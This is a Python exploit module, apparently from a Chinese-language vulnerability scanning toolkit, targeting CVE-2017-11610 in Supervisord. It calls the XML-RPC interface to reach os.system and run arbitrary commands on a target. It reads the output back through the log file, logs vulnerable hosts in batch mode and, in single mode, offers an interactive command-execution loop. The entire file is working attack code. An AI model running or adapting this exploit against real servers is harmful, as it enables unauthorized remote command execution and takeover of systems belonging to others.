#! /usr/bin/python3
# -*- encoding: utf-8 -*-

import urllib3
import xmlrpc.client
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from rich.prompt import Prompt
urllib3.disable_warnings()


class Cve_2017_11610:
        # 命令执行
    def exp(self,target, command):
        ppp = '''
            ========================================================================================
            =   [+] CVE-2017-11610 Supervisord                                                     =
            =   [+] Explain: YaunSky   Time: 2020-12                                               =
            =   [+] python3 CVE-2017-11610.py --url http://127.0.0.1/ --cmd "command"              =
            =====================================================================-==================
        '''
        if not self.batch:
            print(ppp)
        try:
            with xmlrpc.client.ServerProxy(target) as proxy:
                old = getattr(proxy, 'supervisor.readLog')(0, 0)
                logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
                getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')(
                    '{} | tee -a {}'.format(command, logfile))
                result = getattr(proxy, 'supervisor.readLog')(0, 0)
            OutPrintInfoSuc("Supervisord", f'存在Supervisord CVE-2017-11610: {target}')
            if not self.batch:
                OutPrintInfoSuc("Supervisord", f'恭喜您执行成功，结果为: {result[len(old):]}')

            else:
                with open("./result/supervisord_2017_11610.txt","a") as w:
                    w.write(f"{target}\n")
        except Exception:
            if not self.batch:
                OutPrintInfo("Supervisord", '不存在Supervisord CVE-2017-11610')
    def run(self,url,cmd):
        target = url
        command = cmd
        try:
            with xmlrpc.client.ServerProxy(target) as proxy:
                old = getattr(proxy, 'supervisor.readLog')(0, 0)

                logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
                getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')(
                    '{} | tee -a {}'.format(command, logfile))
                result = getattr(proxy, 'supervisor.readLog')(0, 0)
                OutPrintInfoSuc("Supervisord", f'存在Supervisord CVE-2017-11610: {target}')

                if not self.batch:
                    OutPrintInfoSuc("Supervisord", f'恭喜您执行成功，结果为: {result[len(old):]}')
                else:
                    with open("./result/supervisord_2017_11610.txt", "a") as w:
                        w.write(f"{target}\n")
                return True
        except Exception:
            if not self.batch:
                OutPrintInfo("Supervisord", '不存在Supervisord CVE-2017-11610')
            return False

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        cmd = target["cmd"]

        if not self.batch:
            OutPrintInfo("Supervisord", '开始执行Supervisord命令执行...')
        url2 = str(url) + "/RPC2"
        if not self.batch:
            OutPrintInfo("Supervisord", '开始执行Supervisord命令执行POC-1...')
        self.exp(url2,cmd)
        if not self.batch:
            OutPrintInfo("Supervisord", '开始执行Supervisord命令执行POC-2...')
        if self.run(url2,cmd):
            if not self.batch:
                choose = Prompt.ask("[b bright_cyan]是否进行漏洞利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b bright_red]输入需要执行到命令")
                        if cmd == "exit":
                            break
                        self.run(url,cmd)
        if not self.batch:
            OutPrintInfo("Supervisord", 'Supervisord命令执行检测执行结束')

